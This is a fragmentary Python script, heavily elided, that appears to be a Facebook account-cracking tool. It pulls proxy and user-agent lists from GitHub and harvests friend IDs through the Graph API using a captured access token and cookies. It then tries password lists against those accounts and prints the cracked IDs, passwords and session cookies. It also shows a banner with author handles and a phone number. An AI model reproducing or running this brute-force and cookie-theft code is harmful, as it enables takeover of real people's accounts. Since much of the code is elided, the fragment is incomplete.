...
princp=[]
try:
	prox= requests.get('https://github.com/AKASH-XD2/Ss/blob/main/Ss').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/AKASH-XD2/Ss/blob/main/Ss').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'AKASH' and password == 'XD':
...
def banner():
	...
	print (f"""
      ...
      _       ___  ____        _       ______   ____  ____  
     / \     |_  ||_  _|      / \    .' ____ \ |_   ||   _| 
    / _ \      | |_/ /       / _ \   | (___ \_|  | |__| |   
   / ___ \     |  __'.      / ___ \   _.____`.   |  __  |   
 _/ /   \ \_  _| |  \ \_  _/ /   \ \_| \____) | _| |  | |_  
|____| |____||____||____||____| |____|\______.'|____||____| 
                                                            

                                                                                                                                          
\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mBCS\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] AKASH\033[1;39m            ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] AKASH-XD\033[1;39m   ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] ROCKSTER4555\033[1;39m          ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼??𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801775103188\033[1;39m     ┃
...
def public():
	...
	for userr in uid:
		try:
			col = ses.get('https://www.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[0;92m[AKASH-OK ➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTANJID')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
